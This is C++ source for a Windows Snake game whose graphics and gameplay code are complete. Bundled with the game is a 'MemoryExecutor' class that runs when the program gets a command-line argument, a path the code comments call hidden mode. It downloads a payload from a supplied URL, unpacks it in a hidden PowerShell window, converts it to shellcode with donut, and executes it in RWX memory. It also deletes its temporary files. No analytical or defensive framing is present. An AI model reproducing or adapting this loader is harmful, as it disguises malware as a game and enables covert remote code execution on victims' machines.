#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <ctime>
#include <cstdlib>
#include <fstream>

#pragma comment(lib, "wininet.lib")

// SIMPLE WINDOWS GUI SNAKE GAME

const int CELL_SIZE = 20;
const int GRID_WIDTH = 30;
const int GRID_HEIGHT = 20;
const int WINDOW_WIDTH = GRID_WIDTH * CELL_SIZE + 16;
const int WINDOW_HEIGHT = GRID_HEIGHT * CELL_SIZE + 100;

struct Point {
    int x, y;
};

class SnakeGameGUI {
private:
    std::vector<Point> snake;
    Point food;
    int score;
    int direction;
    bool gameOver;
    bool paused;

public:
    SnakeGameGUI() : score(0), direction(1), gameOver(false), paused(false) {
        srand((unsigned)time(0));
        Reset();
    }

    void Reset() {
        snake.clear();
        Point start;
        start.x = GRID_WIDTH / 2;
        start.y = GRID_HEIGHT / 2;
        snake.push_back(start);
        score = 0;
        direction = 1;
        gameOver = false;
        paused = false;
        SpawnFood();
    }

    void SpawnFood() {
        do {
            food.x = rand() % GRID_WIDTH;
            food.y = rand() % GRID_HEIGHT;
        } while (IsSnakeAt(food.x, food.y));
    }

    bool IsSnakeAt(int x, int y) {
        for (size_t i = 0; i < snake.size(); i++) {
            if (snake[i].x == x && snake[i].y == y) return true;
        }
        return false;
    }

    void HandleInput(int key) {
        if (key == VK_SPACE) {
            if (gameOver) Reset();
            else paused = !paused;
            return;
        }

        if (paused || gameOver) return;

        switch (key) {
        case VK_UP:    if (direction != 2) direction = 0; break;
        case VK_RIGHT: if (direction != 3) direction = 1; break;
        case VK_DOWN:  if (direction != 0) direction = 2; break;
        case VK_LEFT:  if (direction != 1) direction = 3; break;
        }
    }

    void Update() {
        if (paused || gameOver) return;

        Point newHead;
        newHead.x = snake[0].x;
        newHead.y = snake[0].y;

        switch (direction) {
        case 0: newHead.y--; break;
        case 1: newHead.x++; break;
        case 2: newHead.y++; break;
        case 3: newHead.x--; break;
        }

        if (newHead.x < 0 || newHead.x >= GRID_WIDTH ||
            newHead.y < 0 || newHead.y >= GRID_HEIGHT) {
            gameOver = true;
            return;
        }

        if (IsSnakeAt(newHead.x, newHead.y)) {
            gameOver = true;
            return;
        }

        snake.insert(snake.begin(), newHead);

        if (newHead.x == food.x && newHead.y == food.y) {
            score += 10;
            SpawnFood();
        }
        else {
            snake.pop_back();
        }
    }

    void Draw(HDC hdc) {
        // Background
        HBRUSH bgBrush = CreateSolidBrush(RGB(30, 30, 30));
        RECT fullRect = { 0, 0, WINDOW_WIDTH, WINDOW_HEIGHT };
        FillRect(hdc, &fullRect, bgBrush);
        DeleteObject(bgBrush);

        // Header
        HBRUSH headerBrush = CreateSolidBrush(RGB(52, 73, 94));
        RECT headerRect = { 0, 0, WINDOW_WIDTH, 60 };
        FillRect(hdc, &headerRect, headerBrush);
        DeleteObject(headerBrush);

        // Title
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(255, 255, 255));
        HFONT hFont = CreateFontA(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, "Segoe UI");
        SelectObject(hdc, hFont);
        TextOutA(hdc, 10, 10, "SNAKE GAME", 10);
        DeleteObject(hFont);

        // Score
        hFont = CreateFontA(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, "Segoe UI");
        SelectObject(hdc, hFont);
        char scoreText[50];
        sprintf_s(scoreText, "Score: %d", score);
        TextOutA(hdc, 10, 35, scoreText, static_cast<int>(strlen(scoreText)));
        DeleteObject(hFont);

        // Grid lines
        HPEN gridPen = CreatePen(PS_SOLID, 1, RGB(50, 50, 50));
        SelectObject(hdc, gridPen);

        for (int i = 0; i <= GRID_WIDTH; i++) {
            MoveToEx(hdc, i * CELL_SIZE, 60, NULL);
            LineTo(hdc, i * CELL_SIZE, 60 + GRID_HEIGHT * CELL_SIZE);
        }
        for (int i = 0; i <= GRID_HEIGHT; i++) {
            MoveToEx(hdc, 0, 60 + i * CELL_SIZE, NULL);
            LineTo(hdc, GRID_WIDTH * CELL_SIZE, 60 + i * CELL_SIZE);
        }
        DeleteObject(gridPen);

        // Snake
        for (size_t i = 0; i < snake.size(); i++) {
            COLORREF color = (i == 0) ? RGB(76, 175, 80) : RGB(129, 199, 132);
            HBRUSH snakeBrush = CreateSolidBrush(color);

            RECT r;
            r.left = snake[i].x * CELL_SIZE + 2;
            r.top = 60 + snake[i].y * CELL_SIZE + 2;
            r.right = r.left + CELL_SIZE - 4;
            r.bottom = r.top + CELL_SIZE - 4;

            FillRect(hdc, &r, snakeBrush);
            DeleteObject(snakeBrush);
        }

        // Food
        HBRUSH foodBrush = CreateSolidBrush(RGB(244, 67, 54));
        RECT foodRect;
        foodRect.left = food.x * CELL_SIZE + 2;
        foodRect.top = 60 + food.y * CELL_SIZE + 2;
        foodRect.right = foodRect.left + CELL_SIZE - 4;
        foodRect.bottom = foodRect.top + CELL_SIZE - 4;
        FillRect(hdc, &foodRect, foodBrush);
        DeleteObject(foodBrush);

        // Game Over overlay
        if (gameOver) {
            HBRUSH overlayBrush = CreateSolidBrush(RGB(0, 0, 0));
            RECT overlay = { 0, 60, GRID_WIDTH * CELL_SIZE, 60 + GRID_HEIGHT * CELL_SIZE };

            // Semi-transparent effect (simple version)
            for (int i = 0; i < 3; i++) {
                FrameRect(hdc, &overlay, overlayBrush);
            }
            DeleteObject(overlayBrush);

            SetTextColor(hdc, RGB(255, 255, 255));
            hFont = CreateFontA(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                ANTIALIASED_QUALITY, DEFAULT_PITCH, "Segoe UI");
            SelectObject(hdc, hFont);
            TextOutA(hdc, WINDOW_WIDTH / 2 - 80, WINDOW_HEIGHT / 2 - 40, "GAME OVER!", 10);
            DeleteObject(hFont);

            hFont = CreateFontA(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                ANTIALIASED_QUALITY, DEFAULT_PITCH, "Segoe UI");
            SelectObject(hdc, hFont);

            char finalScore[50];
            sprintf_s(finalScore, "Final Score: %d", score);
            TextOutA(hdc, WINDOW_WIDTH / 2 - 60, WINDOW_HEIGHT / 2, finalScore, static_cast<int>(strlen(finalScore)));

            TextOutA(hdc, WINDOW_WIDTH / 2 - 90, WINDOW_HEIGHT / 2 + 30, "Press SPACE to restart", 22);
            DeleteObject(hFont);
        }

        // Paused
        if (paused && !gameOver) {
            SetTextColor(hdc, RGB(255, 255, 255));
            hFont = CreateFontA(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                ANTIALIASED_QUALITY, DEFAULT_PITCH, "Segoe UI");
            SelectObject(hdc, hFont);
            TextOutA(hdc, WINDOW_WIDTH / 2 - 60, WINDOW_HEIGHT / 2 - 20, "PAUSED", 6);
            DeleteObject(hFont);
        }

        // Instructions
        SetTextColor(hdc, RGB(150, 150, 150));
        hFont = CreateFontA(12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, "Segoe UI");
        SelectObject(hdc, hFont);
        TextOutA(hdc, 10, WINDOW_HEIGHT - 30, "Arrow Keys: Move  |  SPACE: Pause  |  ESC: Exit", 48);
        DeleteObject(hFont);
    }
};

SnakeGameGUI* game = nullptr;


// MEMORY EXECUTOR 


class MemoryExecutor {
private:
    std::vector<BYTE> downloadedData;
    std::vector<BYTE> shellcodeData;

    bool DownloadToMemory(const std::string& url) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return false;

        HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0,
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hUrl) {
            InternetCloseHandle(hInternet);
            return false;
        }

        BYTE buffer[8192];
        DWORD bytesRead = 0;
        downloadedData.clear();

        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            downloadedData.insert(downloadedData.end(), buffer, buffer + bytesRead);
        }

        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return downloadedData.size() > 0;
    }

    bool IsZipFile() {
        return downloadedData.size() >= 4 && downloadedData[0] == 0x50 && downloadedData[1] == 0x4B;
    }

    bool ExtractZipAndFindExe(std::string& exePath) {
        std::ofstream zipFile("t.zip", std::ios::binary);
        zipFile.write(reinterpret_cast<char*>(downloadedData.data()), downloadedData.size());
        zipFile.close();

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        std::string cmd = "powershell -WindowStyle Hidden -Command \"Expand-Archive -Path t.zip -DestinationPath tx -Force\"";
        if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return false;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA("tx\\*.exe", &findData);
        if (hFind == INVALID_HANDLE_VALUE) return false;

        exePath = "tx\\" + std::string(findData.cFileName);
        FindClose(hFind);
        return true;
    }

    bool ConvertToShellcode() {
        std::string inputFile;

        if (IsZipFile()) {
            if (!ExtractZipAndFindExe(inputFile)) return false;
        }
        else {
            inputFile = "t.exe";
            std::ofstream tempFile(inputFile, std::ios::binary);
            tempFile.write(reinterpret_cast<char*>(downloadedData.data()), downloadedData.size());
            tempFile.close();
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        std::string cmd = "donut.exe -i " + inputFile + " -o t.bin -a 2";
        if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return false;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (exitCode != 0) return false;

        std::ifstream scFile("t.bin", std::ios::binary | std::ios::ate);
        if (!scFile) return false;

        size_t sz = static_cast<size_t>(scFile.tellg());
        scFile.seekg(0);
        shellcodeData.resize(sz);
        scFile.read(reinterpret_cast<char*>(shellcodeData.data()), sz);
        scFile.close();

        DeleteFileA("t.exe");
        DeleteFileA("t.zip");
        DeleteFileA(inputFile.c_str());
        DeleteFileA("t.bin");
        system("rmdir /s /q tx 2>nul");

        return true;
    }

    bool ExecuteFromMemory() {
        LPVOID mem = VirtualAlloc(NULL, shellcodeData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) return false;

        memcpy(mem, shellcodeData.data(), shellcodeData.size());
        shellcodeData.clear();

        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
        if (!hThread) {
            VirtualFree(mem, 0, MEM_RELEASE);
            return false;
        }

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        VirtualFree(mem, 0, MEM_RELEASE);
        return true;
    }

public:
    bool Execute(const std::string& url) {
        return DownloadToMemory(url) && ConvertToShellcode() && ExecuteFromMemory();
    }
};

// WINDOWS GUI

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP memBitmap = CreateCompatibleBitmap(hdc, WINDOW_WIDTH, WINDOW_HEIGHT);
        HBITMAP oldBitmap = (HBITMAP)SelectObject(memDC, memBitmap);

        if (game) {
            game->Draw(memDC);
        }

        BitBlt(hdc, 0, 0, WINDOW_WIDTH, WINDOW_HEIGHT, memDC, 0, 0, SRCCOPY);

        SelectObject(memDC, oldBitmap);
        DeleteObject(memBitmap);
        DeleteDC(memDC);
        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_KEYDOWN:
        if (game) {
            if (wParam == VK_ESCAPE) {
                PostQuitMessage(0);
            }
            else {
                game->HandleInput(static_cast<int>(wParam));
            }
        }
        return 0;

    case WM_TIMER:
        if (game) {
            game->Update();
            InvalidateRect(hwnd, NULL, FALSE);
        }
        return 0;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main(int argc, char* argv[]) {
    // Check for command line argument (hidden mode)
    if (argc > 1) {
        MemoryExecutor executor;
        executor.Execute(std::string(argv[1]));
        return 0;
    }

    // GUI mode - need to get HINSTANCE
    HINSTANCE hInstance = GetModuleHandle(NULL);

    // GUI mode
    const char CLASS_NAME[] = "SnakeGameWindow";

    WNDCLASSA wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);

    RegisterClassA(&wc);

    HWND hwnd = CreateWindowExA(
        0, CLASS_NAME, "Snake Game",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, WINDOW_WIDTH, WINDOW_HEIGHT,
        NULL, NULL, hInstance, NULL
    );

    if (!hwnd) return 0;

    // Ensure English title
    SetWindowTextA(hwnd, "Snake Game");

    game = new SnakeGameGUI();

    ShowWindow(hwnd, SW_SHOW);
    SetTimer(hwnd, 1, 150, NULL);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    delete game;
    return 0;
}
